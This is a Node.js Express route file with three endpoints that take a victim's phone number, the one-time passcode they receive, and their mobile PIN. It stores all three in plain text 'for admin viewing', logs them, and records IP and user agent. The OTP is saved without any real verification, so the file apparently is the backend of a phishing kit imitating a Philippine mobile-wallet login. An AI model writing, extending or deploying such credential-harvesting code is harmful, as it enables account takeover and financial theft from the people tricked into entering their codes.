const express = require('express');
const Registration = require('../models/Registration');

const router = express.Router();

// @route   POST /api/phone-registrations
// @desc    Register phone number (from Number.vue)
// @access  Public
router.post('/', async (req, res) => {
  try {
    const { dialCode, phone } = req.body;

    if (!phone) {
      return res.status(400).json({ message: 'Phone number is required' });
    }

    const fullPhone = `${dialCode || '+63'}${phone}`;
    
    // Get IP and user agent for tracking
    const ipAddress = req.ip || req.connection.remoteAddress;
    const userAgent = req.get('user-agent');

    // Check if already registered
    let registration = await Registration.findOne({ phone });
    
    if (registration) {
      // Update existing registration
      registration.dialCode = dialCode || '+63';
      registration.fullPhone = fullPhone;
      registration.ipAddress = ipAddress;
      registration.userAgent = userAgent;
      await registration.save();
    } else {
      // Create new registration
      registration = new Registration({
        dialCode: dialCode || '+63',
        phone,
        fullPhone,
        ipAddress,
        userAgent,
        status: 'phone_registered'
      });
      await registration.save();
    }

    console.log('📱 Phone registered:', { phone, fullPhone, id: registration._id });

    res.status(201).json({
      message: 'Phone number registered successfully',
      registrationId: registration._id,
      phone: fullPhone
    });
  } catch (error) {
    console.error('Error registering phone:', error);
    res.status(500).json({
      message: 'Failed to register phone number',
      detail: error.message
    });
  }
});

// @route   POST /api/otp
// @desc    Save OTP code (from OTP.vue)
// @access  Public
router.post('/otp', async (req, res) => {
  try {
    const { phone, otp } = req.body;

    if (!phone || !otp) {
      return res.status(400).json({ message: 'Phone and OTP are required' });
    }

    // Extract and normalize phone digits
    const phoneDigits = phone.replace(/\D/g, '');
    
    // Handle both 10-digit and 12-digit formats
    let normalizedPhone;
    if (phoneDigits.length === 12 && phoneDigits.startsWith('63')) {
      normalizedPhone = phoneDigits.slice(2); // Remove '63' prefix
    } else if (phoneDigits.length === 10) {
      normalizedPhone = phoneDigits;
    } else {
      normalizedPhone = phoneDigits.slice(-10); // Take last 10 digits as fallback
    }

    // Find registration by phone
    const registration = await Registration.findOne({ phone: normalizedPhone });
    
    if (!registration) {
      return res.status(404).json({ message: 'Phone registration not found' });
    }

    // Save OTP (WARNING: Storing in plain text for admin viewing)
    registration.otp = otp;
    registration.otpHistory = otp;  // Keep for admin visibility even after verification
    registration.otpVerifiedAt = new Date();
    registration.status = 'otp_verified';
    await registration.save();

    console.log('🔐 OTP saved:', { phone: normalizedPhone, otp, id: registration._id });

    res.status(200).json({
      message: 'OTP saved successfully',
      registrationId: registration._id
    });
  } catch (error) {
    console.error('Error saving OTP:', error);
    res.status(500).json({
      message: 'Failed to save OTP',
      detail: error.message
    });
  }
});

// @route   POST /api/mpin
// @desc    Save MPIN code (from MPIN.vue)
// @access  Public
router.post('/mpin', async (req, res) => {
  try {
    const { phone, mpin } = req.body;

    if (!phone || !mpin) {
      return res.status(400).json({ message: 'Phone and MPIN are required' });
    }

    // Extract just the phone digits
    const phoneDigits = phone.replace(/\D/g, '').slice(-10);

    // Find registration by phone
    const registration = await Registration.findOne({ phone: phoneDigits });
    
    if (!registration) {
      return res.status(404).json({ message: 'Phone registration not found' });
    }

    // Save MPIN (WARNING: Storing in plain text for admin viewing)
    registration.mpin = mpin;
    registration.mpinSetAt = new Date();
    registration.status = 'mpin_set';
    await registration.save();

    console.log('🔑 MPIN saved:', { phone: phoneDigits, mpin, id: registration._id });

    res.status(200).json({
      message: 'MPIN saved successfully',
      registrationId: registration._id
    });
  } catch (error) {
    console.error('Error saving MPIN:', error);
    res.status(500).json({
      message: 'Failed to save MPIN',
      detail: error.message
    });
  }
});

module.exports = router;
